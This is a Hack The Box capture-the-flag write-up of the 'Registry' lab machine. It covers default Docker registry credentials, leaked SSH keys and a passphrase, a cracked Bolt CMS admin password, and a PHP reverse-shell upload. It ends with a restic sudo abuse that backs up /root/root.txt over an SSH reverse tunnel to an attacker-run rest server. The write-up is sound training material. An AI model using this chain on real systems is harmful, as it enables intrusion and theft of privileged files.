---
title: "Hack The Box - Registry"
tags: [linux,hard,docker registry,docker,restic,bolt,rest server,repository,backup]
categories: HackTheBox-Linux
---

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled.png)

## *NMAP*

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%201.png)

### *Enumerating Web and Docker Registry*

⇒ Viewing the certificate we see that there's docker.registry.htb subdomain. First lets enumerate registry.htb. We have /bolt running on [http://registry.htb/bolt/](http://registry.htb/bolt/)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%202.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%202.png)

There's not much on this website except the login page.

⇒ When we visit [docker.registry.ht](http://docker.registry.ht)b we are prompted with an login , we are able to login with admin : admin . Then we get the following 

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%203.png)

- Checking the server response we see that we are in docker registry

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%204.png)

⇒ Lets  take a look at available repository by appending **_catalog**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%205.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%205.png)

- Looks like there's an repository named **bolt-image**

⇒ Lets take a look at tags in the repository bolt-image. We have tag named **latest.**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%206.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%206.png)

⇒ Now lets download the manifest : [http://docker.registry.htb/v2/bolt-image/manifests/latest](http://docker.registry.htb/v2/bolt-image/manifests/latest)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%207.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%207.png)

- Now we have the list of blobs, we can download each blob using the endpoint

Example : [http://docker.registry.htb/v2/bolt-image/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b](http://docker.registry.htb/v2/bolt-image/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b)

⇒ Downloaded all the blobs and extracted them we get an linux system files

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%208.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%208.png)

- We find ssh keys for user bolt in root/.ssh/

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%209.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%209.png)

- Found the ssh key password in **/etc/profile.d/02-ssh.sh** ( You can see this file being created in /root/.bash_history )

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2010.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2010.png)

Password : **GkOcz221Ftb3ugog**

⇒ We ssh'ed in as bolt user and got the flag : 

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2011.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2011.png)

---

### *Privilege Escalation to www-data [ bolt cms ]*

⇒ After looking around for a while we see that there's a php script in /var/www/html that runs the following command as sudo. So lets get www-data to run it as sudo.

```php
<?php shell_exec("sudo restic backup -r rest:http://backup.registry.htb/bolt bolt");
```

⇒ We can write to any files in www-data but we remember that there's bolt cms running on the websites. So we can leverage that to get a shell as www-data. We find the admin login hash in bolt/database :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2012.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2012.png)

- Cracking it we get **admin : strawberry**

⇒ We logged in as admin on http://registry.htb/bolt/bolt/login

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2013.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2013.png)

⇒ Lets start exploiting bolt cms. So on file management we can upload files but are restrcited to certain files, but as we are admin on the cms we can edit the config file to allow php extension so we can upload php-reverse-shell from pentestmonkey

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2014.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2014.png)

- Now lets just upload the php-reverse-shell and trigger it [ NOTE : We used the machine docker interface ip in our reverse shell as it isnt able to connect back to our machine ip ]

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2015.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2015.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2016.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2016.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2017.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2017.png)

### *Privilege Escalation to root [ restic backup ]*

⇒ So finally we have user www-data and running sudo -l we see that we can run the following command as root with nopasswd

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2018.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2018.png)

⇒ So the following command backups a file we want to backup to an rest server repository. So we can exploit this to backup /etc/shadow or /root/root.txt . To do that first we must host an rest server, create a repository and then port forward it using ssh

- Creating the repo :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2019.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2019.png)

- Creating htpasswd file for our rest server to use

**htpasswd -B -c .htpasswd flag [ flag ]**
- Starting our rest server [https://github.com/restic/rest-server/](https://github.com/restic/rest-server/)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2020.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2020.png)

- Finally now lets portforward using ssh

**ssh -i id_rsa -R 8000:127.0.0.1:8000 -N -f bolt@registry.htb**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2021.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2021.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2022.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2022.png)

- Running the command to backup root flag to our rest server flag repository 

**restic backup -r "rest:[http://flag:flag@127.0.0.1:8005/](http://flag:flag@127.0.0.1:8005/)" "/root/root.txt"**

⇒ Now lets dump the flag :

**restic -r flag/ dump latest '/root.txt'**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2023.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Registry%20Box%209916a096cda74f3ba3a69564d298c0ec/Untitled%2023.png)

⇒ That was it folks . This box taught us about **docker registry** , how to exploit **bolt cms** and finally how to exploit **restic backup** with an wildcard that allowed us to specify the repository to backup the file to.

